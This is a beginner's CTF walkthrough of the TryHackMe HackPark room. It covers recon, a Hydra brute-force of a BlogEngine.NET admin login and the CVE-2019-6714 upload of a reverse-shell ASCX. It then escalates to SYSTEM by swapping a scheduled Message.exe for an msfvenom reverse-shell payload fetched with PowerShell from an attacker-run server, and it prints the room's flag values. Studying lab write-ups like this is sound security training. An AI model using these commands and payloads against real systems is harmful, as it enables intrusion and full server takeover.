# HackPark CTF — Beginner's Full Step-by-Step Guide

> **What is this?**
> A complete walkthrough of the HackPark challenge on TryHackMe. You are playing an ethical hacker trying to take full control of a Windows server. Everything is legal and contained inside TryHackMe's safe practice environment.
>
> **Who is this for?**
> Anyone with no IT background. Every step explains **what you are doing**, **why you are doing it**, **where every tool and file comes from**, and **how every decision was made**.

---

## Before You Start — What You Need

| What | Where to get it |
|---|---|
| TryHackMe account | https://tryhackme.com (free) |
| HackPark room | Search "HackPark" on TryHackMe → click Start Machine |
| Kali Linux | Your VM, or TryHackMe's in-browser AttackBox |
| VPN connected | TryHackMe → your profile → Access → download `.ovpn` file |

**Where does Kali Linux come from?**
Kali Linux is a free operating system made specifically for cybersecurity professionals and students. It comes pre-installed with hundreds of security tools (nmap, Hydra, Burp Suite, netcat, msfvenom, etc.) — you don't have to install any of them yourself. Download it from https://www.kali.org or use TryHackMe's browser-based AttackBox which already has everything.

**Finding your IPs — you need these throughout:**
```bash
# Your VPN IP — the address the target uses to call back to you
ip addr show tun0 | grep inet

# The target IP — shown on the TryHackMe HackPark room page after starting the machine
# Example: 10.49.153.22 — yours will be different every session
```

---

## The Big Picture — What Are We Doing?

This target is a **Windows server** running a blog website called BlogEngine.NET. Our goal follows a standard pentest chain:

```
Reconnaissance → Exploitation → Privilege Escalation → Flag Capture
```

1. **Survey the building** — scan what services are running
2. **Pick the front door lock** — brute force the blog admin login
3. **Exploit a known flaw** — use a documented CVE to run our own code on the server
4. **Take the service elevator to the top** — escalate from a low-level user to full SYSTEM control
5. **Collect the flags** — retrieve the hidden proof files

---

## Phase 1 — Reconnaissance: "What's Out There?"

### Step 1.1 — Connect the VPN

```bash
sudo openvpn ~/Downloads/your-thm-vpn.ovpn &
```

Replace `your-thm-vpn.ovpn` with your actual TryHackMe VPN filename.

**Where did this file come from?**
You download it from your TryHackMe profile → Access → "Download configuration file". It's called an OpenVPN config — it contains the credentials and server address needed to join TryHackMe's private network.

**What is this doing?**
Connecting your machine to TryHackMe's private network. Without it, your computer and the target are on completely separate networks and can't communicate.

**Why do we need it?**
The target machine only exists inside TryHackMe's network — it doesn't have a real internet address. The VPN is your tunnel in. Think of it as putting on a visitor badge to enter a secured facility.

Confirm it worked:
```bash
ip addr show tun0 | grep inet
```
You should see a line like `inet 10.x.x.x`. That is **your VPN IP**. Note it down — you'll use it many times throughout this exercise.

---

### Step 1.2 — Scan the Target with nmap

```bash
nmap -Pn -sC -sV -p- 10.49.153.22
```

Replace `10.49.153.22` with your actual target IP.

**Where does nmap come from?**
nmap (Network Mapper) is pre-installed on Kali Linux. It was created in 1997 by Gordon Lyon and is the industry standard for port scanning. Website: https://nmap.org. It's also open source — free and legal to use.

**What is nmap doing?**
Every service running on a computer "listens" on a numbered port (like a phone extension). nmap knocks on all 65535 possible ports and checks which ones answer, then tries to identify what software is running on each open one.

> **Analogy:** Like a security guard walking the perimeter of a building, trying every door and window to see which ones are unlocked — and looking at what's inside each one.

**What do the flags mean?**

| Flag | What it does | Why we use it |
|------|-------------|--------------|
| `-Pn` | Skip the "is this machine alive?" ping check | HackPark blocks ping, so without -Pn nmap would give up before starting |
| `-sC` | Run nmap's built-in detection scripts | These extract extra info — like the exact Windows version, RDP hostname, HTTP page title |
| `-sV` | Probe each open port for the exact software version | We need the exact version to look up known vulnerabilities |
| `-p-` | Scan all 65535 ports, not just the top 1000 | Services sometimes run on unusual port numbers; `-p-` makes sure we don't miss any |

**Why do we scan before anything else?**
You can't attack what you don't know exists. The nmap scan is your map — without it you're guessing. Every pentest starts here.

**Expected output:**
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 8.5
3389/tcp open  ms-wbt-server Microsoft Terminal Services
  rdp-ntlm-info:
    Target_Name: HACKPARK
    Product_Version: 6.3.9600
```

**What does this tell us?**

| Result | Meaning | What we do with it |
|--------|---------|-------------------|
| `80/tcp open http — Microsoft IIS 8.5` | A website is running here, hosted on Microsoft's web server | Browse to it in a browser |
| `3389/tcp open ms-wbt-server` | Remote Desktop (RDP) is open — someone can log in graphically | Note it as a security risk (H-04 in the report) |
| `Product_Version: 6.3.9600` | Windows Server 2012 R2 — End of Life since October 2023 | Flag as unpatched/unsupported |
| `Target_Name: HACKPARK` | The computer's hostname | Confirms we're looking at the right machine |

---

### Step 1.3 — Visit the Website and Identify the Software

Open your browser and go to: `http://10.49.153.22`

**Why do we visit it in a browser?**
The nmap result told us *something* is on port 80, but not exactly what. Browsing gives us the full picture — the actual website, any visible software names, version numbers in the page source.

**What is BlogEngine.NET?**
It's a blog management platform — similar to WordPress but built on Microsoft's .NET technology. It lets people publish articles via a website with an admin control panel. The name and version appear in the page footer and/or the HTML source code.

**How did we identify the version as 3.3.6?**
Look at the HTML source code of the page (right-click → View Page Source in your browser). BlogEngine.NET typically includes its version number in a `<meta>` tag or in the page generator tag. Alternatively, nmap's `-sC` scripts sometimes extract this.

**Why does the version number matter?**
Because security researchers publish known vulnerabilities for specific versions. Once we know it's BlogEngine.NET 3.3.6, we can search databases of known exploits and find that CVE-2019-6714 applies exactly to this version.

**Find the admin login page:**
Navigate to: `http://10.49.153.22/Account/login.aspx`

**How did we know this URL?**
`/Account/login.aspx` is the default login URL for every installation of BlogEngine.NET — it never changes. This is public knowledge in BlogEngine.NET's own documentation. It's also discoverable by running a directory scanner (gobuster) or simply by clicking the "Sign In" link on the website.

**Why `admin` as the username?**
BlogEngine.NET creates an account named `admin` by default during installation. Many administrators never change this default username. This is documented in BlogEngine.NET's official setup guide and is widely known in the security community.

---

## Phase 2 — Breaking In: Brute Forcing the Admin Password

### Step 2.1 — Capture the Login Request with Burp Suite

**What is Burp Suite?**
Burp Suite is a web security testing tool made by a company called PortSwigger (https://portswigger.net). It acts as a proxy — it sits between your browser and the website and intercepts every request going back and forth. You can see exactly what data gets sent when you click a button.

**Where does Burp Suite come from?**
Burp Suite Community Edition is free and pre-installed on Kali Linux. Open it from the applications menu or type `burpsuite` in the terminal.

**Why do we need Burp Suite before running Hydra?**
The BlogEngine.NET login form includes hidden security tokens called `__VIEWSTATE` and `__EVENTVALIDATION`. These are generated fresh every time the page loads and embedded invisibly in the form. The login POST request fails without them.

Hydra needs to know the **exact format** of a valid login request — including these tokens — to replicate it. Burp captures one real request so we can copy the format.

**Set up Burp:**
1. Open Burp Suite → go to **Proxy** tab → **Intercept** tab → click **Intercept is on**
2. Set Firefox to use Burp as a proxy: Settings → Network Settings → Manual Proxy → `127.0.0.1` port `8080`
3. Go to the login page in Firefox and try logging in with `admin` / `anything`
4. Burp captures the request — it looks like this:

```
POST /Account/login.aspx HTTP/1.1
Host: 10.49.153.22
...
__VIEWSTATE=LONG_BASE64_STRING&__EVENTVALIDATION=ANOTHER_LONG_STRING&
ctl00$MainContent$LoginUser$UserName=admin&
ctl00$MainContent$LoginUser$Password=anything&
ctl00$MainContent$LoginUser$LoginButton=Log+in
```

Copy the full `__VIEWSTATE` and `__EVENTVALIDATION` values — you'll paste them into the Hydra command.

---

### Step 2.2 — Run Hydra to Find the Password

```bash
hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  10.49.153.22 \
  http-post-form \
  "/Account/login.aspx:__VIEWSTATE=PASTE_VALUE&__EVENTVALIDATION=PASTE_VALUE&ctl00\$MainContent\$LoginUser\$UserName=^USER^&ctl00\$MainContent\$LoginUser\$Password=^PASS^&ctl00\$MainContent\$LoginUser\$LoginButton=Log+in:Login failed" \
  -t 30
```

**Where does Hydra come from?**
Hydra (full name: THC-Hydra) is a free, open-source brute-force tool. It's pre-installed on Kali Linux. Originally created by "The Hacker's Choice" research group. It supports dozens of protocols — HTTP forms, SSH, FTP, RDP, and more. Documentation: https://github.com/vanhauser-thc/thc-hydra

**What is Hydra doing?**
It takes every password from the `rockyou.txt` wordlist and sends a login request to the website using that password. It does this automatically, thousands of times, until it finds one that works.

> **Analogy:** Instead of you typing one password at a time and checking, Hydra is 30 people simultaneously trying passwords — non-stop.

**What is `/usr/share/wordlists/rockyou.txt`?**
A famous file containing 14.3 million real passwords collected from a data breach in 2009. A social gaming website called RockYou was hacked and their entire password database was stolen and published online. Security researchers compiled it into this wordlist. It's included on Kali Linux at `/usr/share/wordlists/rockyou.txt.gz` — decompress it first with `gunzip /usr/share/wordlists/rockyou.txt.gz`.

These real-world passwords are used for testing because people reuse passwords from site to site. If someone used `1qaz2wsx` on RockYou in 2009, they might be using the same password on their blog today.

**What does each Hydra flag mean?**

| Flag | Meaning |
|------|---------|
| `-l admin` | Use `admin` as the fixed username (lowercase L = single user) |
| `-P rockyou.txt` | Try every password in this file (uppercase P = password list) |
| `http-post-form` | The type of attack — an HTTP form submission (what browsers do when you click Login) |
| `^USER^` | Placeholder Hydra replaces with the username |
| `^PASS^` | Placeholder Hydra replaces with each password from the list |
| `:Login failed` | The text Hydra looks for to know a login attempt failed — if this text is NOT in the response, it means the login succeeded |
| `-t 30` | Use 30 parallel threads — 30 attempts happening simultaneously |

**Why does this work here?**
The website has no login rate limiting — it will accept an unlimited number of login attempts. A properly secured website would block an IP or lock the account after 5 or 10 failures. This one doesn't, so Hydra runs unchallenged.

**Expected result:**
```
[80][http-post-form] host: 10.49.153.22   login: admin   password: 1qaz2wsx
```

Log into the website with `admin` / `1qaz2wsx` — you now have admin access to the blog.

---

## Phase 3 — Getting a Foothold: CVE-2019-6714

### What is a CVE and Where Does the Information Come From?

**CVE** stands for **Common Vulnerabilities and Exposures**. It's a global database of publicly disclosed security vulnerabilities maintained by MITRE Corporation (a US non-profit). Every confirmed vulnerability gets an official ID in the format `CVE-YEAR-NUMBER`.

**Where we looked up CVE-2019-6714:**
Once we identified the software as BlogEngine.NET 3.3.6, we searched these databases:

| Resource | URL | What it contains |
|----------|-----|-----------------|
| **Exploit Database (ExploitDB)** | https://www.exploit-db.com | Published exploit code with instructions — searchable by software name |
| **NIST NVD** | https://nvd.nist.gov | Official vulnerability data, CVSS scores, patched versions |
| **MITRE CVE** | https://cve.mitre.org | CVE descriptions and references |
| **searchsploit** | Kali command-line tool | Local copy of ExploitDB, works offline |

**How we searched:**
```bash
searchsploit blogengine
```
Output shows:
```
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution  | aspx/webapps/46353.cs
```

This tells us ExploitDB has entry **#46353** — a published exploit for BlogEngine.NET 3.3.6. The `.cs` extension means the original exploit proof-of-concept is written in C# (Microsoft's programming language).

**What CVE-2019-6714 actually is:**
The file manager in BlogEngine.NET 3.3.6 doesn't properly validate the path when you upload a file. An authenticated admin can upload a file with a carefully crafted path that places it inside the `App_Data/files/` folder. The blog's "theme" loading mechanism can then be pointed at that folder, causing the server to load and execute any `.ascx` file found there as a web control — which means arbitrary code execution.

---

### Step 3.1 — Obtain the Payload File (PostView.ascx)

**What is PostView.ascx?**
An ASP.NET web control file. ASP.NET is Microsoft's web programming platform — `.ascx` files are "user controls" that contain code the server executes. BlogEngine.NET normally uses `PostView.ascx` as a template to display blog posts. We replace it with our own malicious version.

**Where does the malicious PostView.ascx come from?**

The original was found on Exploit Database entry **#46353**:
```bash
searchsploit -m aspx/webapps/46353.cs
# This downloads the file to your current directory
```
Or directly from: https://www.exploit-db.com/exploits/46353

**What's inside PostView.ascx — explained in plain English:**
The file contains C# code that, when executed by the ASP.NET server, opens a network connection from the server back to your machine. This is the reverse shell — it gives you a command prompt inside the server.

The key parts you need to change before using it:
```
# In the file, find and update:
String host = "YOUR_TUN0_IP";   # change to your VPN IP
int port = 4444;                  # the port your listener is waiting on
```

You edit this with any text editor:
```bash
nano PostView.ascx
# Change the IP and port, save with Ctrl+O, exit with Ctrl+X
```

---

### Step 3.2 — How the Exploit Script (exploit_cve.py) Was Created

**Where did exploit_cve.py come from?**
We wrote it ourselves — but based on the published exploit from ExploitDB #46353 and the CVE description. Here's how:

1. **Read the ExploitDB entry** to understand the vulnerability mechanics (what upload endpoint to use, what path the file needs to go to, how the theme trigger works)
2. **Tested manually** — first we tried doing the steps by hand using curl commands to understand each step
3. **Automated it in Python** — because the exploit requires multiple chained steps (login → upload → trigger), each depending on the previous, we wrote a Python script to automate the whole sequence

**Why Python specifically?**
- The login form requires scraping a hidden security token (`__VIEWSTATE`) from the HTML — this is easy in Python using `re` (regex) but painful to do manually
- `requests.Session()` automatically handles cookies — once you log in, the session cookie is kept for all subsequent requests automatically
- It can handle the multipart file upload format that the API requires
- The script gives clear status messages at each step so you know exactly what's happening

**The three main stages the script does:**

```
Stage 1 — Login
  GET /Account/login.aspx      → extract __VIEWSTATE and __EVENTVALIDATION from HTML
  POST /Account/login.aspx     → submit credentials + tokens → get session cookie

Stage 2 — Upload
  POST /api/upload?action=filemgr → upload PostView.ascx as a multipart file
  The API places it in App_Data/files/YYYY/MM/ based on the current date

Stage 3 — Trigger
  GET /?theme=../../App_Data/files/2026/03/
  The server loads PostView.ascx as a theme → executes the reverse shell code
  → connection times out on the script (normal) → check your nc listener
```

**Why does a "TIMEOUT" mean it worked?**
When the server executes PostView.ascx, it opens a connection back to your netcat listener and stays connected — waiting for commands. This means the HTTP request to trigger it never finishes (the server is busy running the shell). Python's `requests` library raises a `ReadTimeout` exception. We catch that and print "TIMEOUT — shell executed" because a timeout in this context means success.

---

### Step 3.3 — Start Your Listener (Terminal 1)

**Open a new terminal and run:**
```bash
nc -lvnp 4444
```

**Where does nc (netcat) come from?**
Netcat is a fundamental networking utility pre-installed on Kali Linux (and most Linux systems). It's often called the "Swiss army knife" of networking. Created in 1995, it can open TCP/UDP connections in either direction. On Kali it's typically the `ncat` or `netcat-openbsd` package.

**What is this command doing?**

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode — wait for incoming connections instead of making outgoing ones |
| `-v` | Verbose — show connection messages |
| `-n` | No DNS resolution — use raw IPs (faster, no noise) |
| `-p 4444` | Listen on port 4444 |

**Why port 4444?**
Convention. Port 4444 is a commonly used test port that is typically not blocked by Windows firewalls on internal networks. You can use any free port — 4444, 1234, 9999 all work. It must match the port number you put in PostView.ascx.

Leave this terminal open and running — it's your receiver.

> **Analogy:** You've opened your front door and you're standing there waiting for someone to knock.

---

### Step 3.4 — Run the Exploit (Terminal 2)

First, make sure your exploit_cve.py has the correct IPs and port:
- `TARGET` = your HackPark target IP
- `LHOST` = your tun0 IP (the VPN IP you noted in Step 1.1)
- `LPORT` = 4444 (must match Step 3.3)

Then run:
```bash
python3 ~/projects/HackPark/exploit_cve.py
```

**Why `python3` specifically?**
The script uses Python 3 syntax and the `requests` library. Python 3 is pre-installed on Kali Linux. The `requests` library is also pre-installed (`pip install requests` if needed). Python 2 is outdated and retired; always use Python 3.

**Why is the script in `~/projects/HackPark/`?**
That's the project folder we created to keep all files for this engagement organised — the exploit script, the PostView.ascx payload, nmap results, notes. Good organisation is part of professional pentesting practice.

**Expected output in Terminal 2:**
```
[*] Getting login page...
[+] VIEWSTATE extracted
[*] Logging in as admin...
[+] Logged in — at: http://10.49.153.22/admin/
[*] Uploading PostView.ascx via /api/upload?action=filemgr...
[+] Upload: 201
[!] Starting trigger — nc listener should be on port 4444
[*] GET /?theme=../../App_Data/files/2026/03/
[+] Timeout — shell likely executed! Check nc listener!
```

---

### Step 3.5 — The Shell Arrives (Terminal 1)

Switch to Terminal 1 (your netcat listener). You should see:

```
Listening on 0.0.0.0 4444
connect to [YOUR IP] from (UNKNOWN) [10.49.153.22] 49347
```

Type commands directly:
```cmd
whoami
```
```
iis apppool\blog
```

**You are now inside the Windows server remotely.**

**What is `iis apppool\blog`?**
IIS (Internet Information Services) is Microsoft's web server software. Each website it hosts runs under a dedicated service account called an "application pool" account. `iis apppool\blog` is the account for the "blog" website. It has limited permissions — like a delivery person with access to the loading dock but not the manager's office.

**Why are we in `C:\windows\system32\inetsrv>` specifically?**
That's the working directory of the IIS process — where the web server runs from. It's where our shell spawned.

---

## Phase 4 — Taking Full Control: Privilege Escalation to SYSTEM

### The Goal: Why We Need Higher Privileges

As `iis apppool\blog`, we can read web files and run basic commands, but we can't:
- Read other users' files
- Read the Windows password database
- Install persistent backdoors
- Access the Administrator's desktop where the root flag is

We need `NT AUTHORITY\SYSTEM` — the highest possible account on Windows. Even higher than Administrator. The operating system core itself runs as SYSTEM.

---

### Step 4.1 — Download and Run WinPEAS to Find Escalation Paths

**What is WinPEAS?**
WinPEAS (Windows Privilege Escalation Awesome Script) is an automated enumeration tool that scans a Windows machine for hundreds of known privilege escalation weaknesses. It checks file permissions, running services, scheduled tasks, stored credentials, registry settings, and much more.

**Where does WinPEAS come from?**
It's an open-source tool on GitHub: https://github.com/carlospolop/PEASS-ng

Download it to your Kali machine:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -O /tmp/winPEAS.bat
```

**Why use WinPEAS instead of checking manually?**
Manually checking every possible escalation path on a Windows machine would take hours. WinPEAS checks them all automatically in minutes and highlights the dangerous findings in red/yellow. It's the standard first step after gaining a low-privilege shell on Windows.

**Serve it to the target** (from Terminal 2):
```bash
python3 -m http.server 8080 -d /tmp/
```

**What is `python3 -m http.server`?**
Python has a built-in web server that you can start instantly with one command. `-m http.server` tells Python to run its built-in HTTP server module. `8080` is the port. `-d /tmp/` serves files from the /tmp directory. This lets the target Windows machine download files from your Kali machine over HTTP — like a temporary file server you spin up in seconds.

**Why Python's HTTP server instead of something else?**
It requires no installation, no configuration, and works immediately. For a temporary file delivery during a pentest, it's the fastest option available.

**Download and run WinPEAS on the target** (from Terminal 1 — your shell):
```cmd
powershell -c "Invoke-WebRequest http://<YOUR-TUN0-IP>:8080/winPEAS.bat -OutFile C:\Windows\Temp\wp.bat"
C:\Windows\Temp\wp.bat
```

**What is PowerShell here?**
PowerShell is Windows' advanced command-line shell — more powerful than the old `cmd.exe`. `Invoke-WebRequest` is PowerShell's equivalent of downloading a file from the internet (like clicking a download link). We use PowerShell because our IIS shell is limited — standard `cmd.exe` commands like `copy` often fail due to permission restrictions.

**Why save to `C:\Windows\Temp`?**
The Temp folder is writable by any user — it's designed for temporary files. Our low-privilege account has write access here. System directories like `C:\Windows\System32` would reject our write attempts.

**What WinPEAS finds — the key result:**
```
[+] INTERESTING: C:\Program Files (x86)\SystemScheduler\Message.exe
    Permissions: Everyone:(F)
    [*] Binary runs as SYSTEM via SystemScheduler service
```

`Everyone:(F)` = Every user on the system has Full Control over this file. That includes us. This is the vulnerability.

---

### Step 4.2 — Understand What SystemScheduler Is and Why It Matters

**What is SystemScheduler?**
A third-party task scheduling software installed on this Windows server. It's configured to run `Message.exe` automatically on a timer — approximately every 30 seconds — as `NT AUTHORITY\SYSTEM`.

**Why does it run as SYSTEM?**
Whoever set up this server configured SystemScheduler to run with SYSTEM privileges. This is often done so scheduled tasks can perform admin-level operations. The critical mistake: the executable it runs (`Message.exe`) is in a folder that any user can write to.

**Why is `Everyone:(F)` a vulnerability?**
File permissions on Windows control who can read, write, or run each file. `Everyone:(F)` means the entire "Everyone" group (which includes all accounts — including our IIS service account) has **Full** permission — meaning we can replace the file with anything we want.

> **Analogy:** Imagine a robot that walks to a specific desk every 30 seconds and runs whatever program it finds there — as the CEO. If anyone in the building can put something on that desk, the robot will run it as the CEO.

---

### Step 4.3 — Generate a Malicious Executable with msfvenom

**From Terminal 2 (your Kali machine):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-TUN0-IP> LPORT=5555 -f exe -o /tmp/Message.exe
```

**Where does msfvenom come from?**
msfvenom is part of the **Metasploit Framework** — the world's most widely used penetration testing framework, developed by Rapid7 and the open-source community. Pre-installed on Kali Linux. msfvenom specifically is the payload generation tool — it creates standalone malicious files without needing Metasploit to be running.
Website: https://www.metasploit.com

**What is msfvenom doing here?**
Creating a Windows executable file (`.exe`) that, when run on the target, opens a connection back to your machine and gives you a command shell. This is called a **reverse shell payload**.

**What each flag means:**

| Flag | Meaning |
|------|---------|
| `-p windows/x64/shell_reverse_tcp` | The payload type: a reverse TCP shell for 64-bit Windows |
| `LHOST=<YOUR-TUN0-IP>` | Your VPN IP — the address the target connects back to |
| `LPORT=5555` | The port on your machine to connect to (must match Step 4.4) |
| `-f exe` | Output format: Windows executable |
| `-o /tmp/Message.exe` | Save the output file to /tmp, named Message.exe |

**Why name it `Message.exe`?**
Because that's the exact filename that SystemScheduler is looking for in the folder. We're replacing the legitimate `Message.exe` with ours — same name, same location, completely different content.

**Why `LPORT=5555` and not `4444` again?**
Port 4444 is already occupied by our existing shell connection from Phase 3. We need a separate port for the new SYSTEM-level connection. Any free port works — 5555 is a clean choice.

**Why `windows/x64/shell_reverse_tcp`?**
- `windows` = the target is Windows (not Linux or Mac)
- `x64` = 64-bit architecture (we confirmed this from nmap's OS detection showing Windows Server 2012 R2, which is 64-bit)
- `shell_reverse_tcp` = a raw command shell sent back over TCP (simpler and more reliable than a Meterpreter session for this purpose)

---

### Step 4.4 — Open a Second Listener for SYSTEM (Terminal 3)

Open a brand new terminal on your Kali machine:
```bash
nc -lvnp 5555
```

Same tool as before (netcat), different port. This waits for the SYSTEM-level connection that our malicious Message.exe will make when SystemScheduler runs it.

---

### Step 4.5 — Transfer the Payload to the Target

**In your current shell (Terminal 1 — the one where you're logged in as iis apppool\blog):**
```cmd
powershell -c "Invoke-WebRequest http://<YOUR-TUN0-IP>:8080/Message.exe -OutFile C:\Windows\Temp\Message.exe"
```

This downloads our malicious `Message.exe` from our Python HTTP server (still running in Terminal 2) into the Temp folder on the target.

**Why Temp first and not directly into the SystemScheduler folder?**
We need to be certain the file fully downloads before placing it. If we downloaded directly to the SystemScheduler folder and SystemScheduler ran the partial file mid-download, it would fail or crash. Download to Temp first, then move — safer and more reliable.

---

### Step 4.6 — Replace the Legitimate Message.exe

```cmd
powershell -c "Copy-Item C:\Windows\Temp\Message.exe 'C:\Program Files (x86)\SystemScheduler\Message.exe' -Force"
```

**What is `-Force` doing?**
It tells PowerShell to overwrite the existing file without asking for confirmation. Without `-Force` it would prompt "are you sure?" — which doesn't work in a non-interactive shell.

**Why `Copy-Item` and not just `copy`?**
In a limited IIS shell, the basic Windows `copy` command fails due to path parsing issues with spaces in folder names (`Program Files (x86)` has spaces). PowerShell's `Copy-Item` handles this correctly.

**What happens now?**
SystemScheduler is running its timer in the background. Within ~30 seconds, it will look at `C:\Program Files (x86)\SystemScheduler\Message.exe`, find our file, and run it — as SYSTEM. Our file opens a connection to port 5555 on your Kali machine.

---

### Step 4.7 — Receive the SYSTEM Shell (Terminal 3)

Wait up to 60 seconds. Watch Terminal 3.

You should see:
```
connect to [YOUR IP] from (UNKNOWN) [10.49.153.22] 49348
C:\PROGRA~2\SYSTEM~1>whoami
nt authority\system
```

**You have full control of the machine.**

`C:\PROGRA~2\SYSTEM~1>` is Windows' old 8.3 shorthand path for `C:\Program Files (x86)\SystemScheduler\` — that's where the process ran from (the SystemScheduler directory), confirming it executed from where we expected.

---

### Step 4.8 — Collect the Flags

```cmd
type C:\Users\jeff\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

**Why are the flags in these specific locations?**
TryHackMe rooms follow a standard CTF convention: the "user flag" is in a regular user's desktop folder (jeff, in this case — another account on the machine), and the "root flag" is in the Administrator's desktop. You need SYSTEM-level access to read the Administrator's desktop.

| Flag | Location | Needs |
|------|----------|-------|
| user.txt | `C:\Users\jeff\Desktop\user.txt` | Any shell on the machine |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` | SYSTEM or Administrator access |

**Expected values:**
```
user.txt → 759bd8af507517bcfaede78a21a73e39
root.txt → 7e13d97f05f7ceb9881a3eb3d78d3e72
```

---

## Full Summary — Every Step and Why It Worked

| Step                       | What We Did                                 | Where the Tool/File Came From                 | Why It Worked                                                       |
| -------------------------- | ------------------------------------------- | --------------------------------------------- | ------------------------------------------------------------------- |
| Connect VPN                | `sudo openvpn thm.ovpn`                     | Downloaded from TryHackMe profile             | Without VPN we can't reach the target network                       |
| Port scan                  | `nmap -Pn -sC -sV -p-`                      | Pre-installed on Kali                         | Found port 80 (website) and 3389 (RDP)                              |
| Visit website              | Browser → `http://[target]`                 | Browser                                       | Identified BlogEngine.NET 3.3.6 and the login URL                   |
| Look up CVE                | searchsploit / exploit-db.com               | Kali (`searchsploit`), web (`exploit-db.com`) | Found CVE-2019-6714 and ExploitDB #46353 affects this exact version |
| Get payload                | ExploitDB #46353 (`searchsploit -m`)        | exploit-db.com / Kali                         | The published C# reverse shell template; edited to add our IP       |
| Write exploit script       | `exploit_cve.py`                            | Written by us based on ExploitDB + testing    | Automates the 3-step chain: login → upload → trigger                |
| Capture login format       | Burp Suite                                  | Pre-installed on Kali                         | Extracted `__VIEWSTATE` tokens needed by Hydra                      |
| Brute force password       | Hydra + rockyou.txt                         | Pre-installed on Kali                         | No login rate limit; found `admin:1qaz2wsx`                         |
| Start listener             | `nc -lvnp 4444`                             | Pre-installed on Kali                         | Receives the reverse shell connection                               |
| Run exploit                | `python3 exploit_cve.py`                    | Written by us                                 | Uploaded PostView.ascx and triggered execution via theme cookie     |
| Shell as IIS user          | Terminal 1 shows `iis apppool\blog`         | —                                             | Server ran our uploaded malicious ASCX file                         |
| Download WinPEAS           | `wget` from GitHub                          | https://github.com/carlospolop/PEASS-ng       | Automated enumeration; found SystemScheduler misconfiguration       |
| Serve files                | `python3 -m http.server 8080`               | Built into Python (pre-installed)             | Gave target a URL to download files from our machine                |
| Create SYSTEM payload      | `msfvenom -p windows/x64/shell_reverse_tcp` | Part of Metasploit (pre-installed on Kali)    | Generated a Windows EXE that calls back to us                       |
| Second listener            | `nc -lvnp 5555`                             | Pre-installed on Kali                         | Ready to receive the SYSTEM-level connection                        |
| Download payload to target | PowerShell `Invoke-WebRequest`              | Built into Windows                            | Got our Message.exe onto the target's Temp folder                   |
| Replace Message.exe        | PowerShell `Copy-Item -Force`               | Built into Windows                            | Swapped legitimate file with our payload                            |
| SYSTEM shell arrives       | Terminal 3 shows `nt authority\system`      | —                                             | SystemScheduler ran our file automatically with SYSTEM privileges   |
| Flags captured             | `type C:\Users\...\Desktop\*.txt`           | —                                             | SYSTEM access lets us read any file on the machine                  |
|                            |                                             |                                               |                                                                     |

---

## Where Every File and Tool Came From — Quick Reference

| File / Tool            | Origin                                               | How to get it                                                                       |
| ---------------------- | ---------------------------------------------------- | ----------------------------------------------------------------------------------- |
| **nmap**               | Pre-installed on Kali                                | `nmap` (already there)                                                              |
| **Burp Suite**         | Pre-installed on Kali                                | Open from applications menu or type `burpsuite`                                     |
| **Hydra**              | Pre-installed on Kali                                | `hydra` (already there)                                                             |
| **rockyou.txt**        | Leaked from RockYou breach 2009 — included on Kali   | `/usr/share/wordlists/rockyou.txt.gz` → decompress first                            |
| **netcat (nc)**        | Pre-installed on Kali                                | `nc` (already there)                                                                |
| **Python**             | Pre-installed on Kali                                | `python3` (already there)                                                           |
| **exploit_cve.py**     | Written by us, based on ExploitDB #46353             | Our project folder `~/projects/HackPark/`                                           |
| **PostView.ascx**      | ExploitDB entry #46353                               | `searchsploit -m aspx/webapps/46353.cs` then renamed and edited                     |
| **msfvenom**           | Part of Metasploit Framework — pre-installed on Kali | `msfvenom` (already there)                                                          |
| **WinPEAS**            | Open source, GitHub                                  | `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat` |
| **CVE-2019-6714 data** | NIST NVD, MITRE CVE, ExploitDB                       | nvd.nist.gov, exploit-db.com, `searchsploit blogengine`                             |

---

## Glossary — Every Term Explained

| Term | What it means |
|------|--------------|
| **Port** | A numbered doorway on a computer. Port 80 = website, Port 3389 = remote desktop, Port 22 = SSH |
| **nmap** | Network scanner — checks which ports are open and what software runs on each |
| **IIS** | Internet Information Services — Microsoft's web server software that hosts websites on Windows |
| **BlogEngine.NET** | A blog platform built on Microsoft's .NET technology — the software running the HackPark website |
| **CVE** | Common Vulnerabilities and Exposures — a public ID number for a confirmed security flaw |
| **ExploitDB** | A public database of published exploit code at exploit-db.com — searchable by software name |
| **searchsploit** | Kali command-line tool to search ExploitDB offline |
| **Brute force** | Automatically trying thousands of passwords until one works |
| **Hydra** | Automated brute-force tool that tests login credentials at high speed |
| **rockyou.txt** | A list of 14 million real passwords from a 2009 data breach — included on Kali |
| **Burp Suite** | A web traffic interceptor — lets you see and modify every request between browser and website |
| **__VIEWSTATE** | A hidden ASP.NET security token embedded in web forms — required for login to work |
| **Reverse shell** | The target computer connects back to you, giving you remote command access — bypasses firewalls |
| **Netcat (nc)** | A basic networking tool that can open or receive any TCP/UDP connection |
| **ASCX file** | ASP.NET user control — a code file the web server executes as part of a page |
| **PostView.ascx** | The malicious file we uploaded — disguised as a theme control but contains a reverse shell |
| **msfvenom** | Part of Metasploit — generates standalone malicious payloads (EXE files, shellcode, etc.) |
| **Payload** | A malicious file or code that does the attacker's bidding on the target |
| **WinPEAS** | Automated Windows privilege escalation scanner — finds misconfigurations and weak permissions |
| **Privilege escalation** | Moving from a low-privilege account to a high-privilege one |
| **NT AUTHORITY\SYSTEM** | The highest account on Windows — even above Administrator. The OS core runs as SYSTEM |
| **SystemScheduler** | A third-party task manager installed on the HackPark server that ran Message.exe every 30 seconds |
| **ACL / Permissions** | Access Control List — who is allowed to read, write, or execute each file |
| **Everyone:(F)** | Windows permission meaning every user has Full Control over the file — a critical misconfiguration |
| **Python HTTP server** | `python3 -m http.server` — instantly creates a web server to serve files from a local folder |
| **PowerShell** | Windows' advanced command shell — more powerful than cmd.exe; used for file downloads and copies |
| **Metasploit** | The world's most widely used penetration testing framework — msfvenom is part of it |
| **Scheduled task / Service** | A program set to run automatically at intervals — like a phone alarm that runs software instead of ringing |

---

## Troubleshooting — When Things Go Wrong

| Problem | What to check |
|---------|--------------|
| nmap shows nothing | Confirm VPN is connected (`ip addr show tun0` shows an IP). Restart the target machine on TryHackMe |
